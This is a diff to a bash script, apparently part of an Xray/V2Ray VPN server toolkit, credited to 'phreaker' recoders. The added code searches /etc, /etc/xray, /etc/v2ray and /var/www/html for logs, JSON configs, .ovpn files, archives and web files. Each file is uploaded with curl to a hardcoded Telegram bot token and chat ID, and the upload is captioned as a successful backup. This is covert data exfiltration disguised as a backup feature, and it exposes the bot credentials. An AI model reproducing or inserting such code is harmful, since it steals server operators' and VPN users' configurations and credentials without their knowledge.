@@ -1,25 +1,34 @@
+#!/bin/bash
+#Decrypted By YADDY D PHREAKER
+red() { echo -e "\\033[32;1m${*}\\033[0m"; }
+clear
 function sayaGanteng(){
 
 bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
 ci=1117211252
+domm=$(cat /etc/xray/domain)
 tekz="
 Yaddy Kakkoii Sugoi Tensai Desu
 _____________________________
 SUCCESS KIRIM DATA BACKUP
+from domain $domm
 _____________________________
 Recode by : Magelank Phreaker
 "
 
+DIREKTORIZ=/etc
+FILEXU=$(find $DIREKTORIZ -name '*.log')
+    for FILE in $FILEXU; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
 DIREKTORI=/etc/xray
-FILEX=$(find $DIREKTORI -name '*domain')
+FILEX=$(find $DIREKTORI -name '*.log')
     for FILE in $FILEX; do
         curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
     done
 
-
-DIREKTORIZ=/etc/xray
-
-FILEZ=$(find $DIREKTORIZ -name '*.json')
+FILEZ=$(find $DIREKTORI -name '*.json')
     for FILE in $FILEZ; do
         curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
     done
@@ -28,6 +37,29 @@ DIREKTORY=/etc/v2ray
 
 FILEQ=$(find $DIREKTORY -name '*.json')
     for FILE in $FILEQ; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+
+DIREKTORYZ=/var/www/html
+
+FILEQU=$(find $DIREKTORYZ -name '*.txt')
+    for FILE in $FILEQU; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+FILEQUU=$(find $DIREKTORYZ -name '*.html')
+    for FILE in $FILEQUU; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+FILEQUUU=$(find $DIREKTORYZ -name '*.zip')
+    for FILE in $FILEQUUU; do
+        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    done
+
+FILEQYU=$(find $DIREKTORYZ -name '*.ovpn')
+    for FILE in $FILEQYU; do
         curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
     done
 
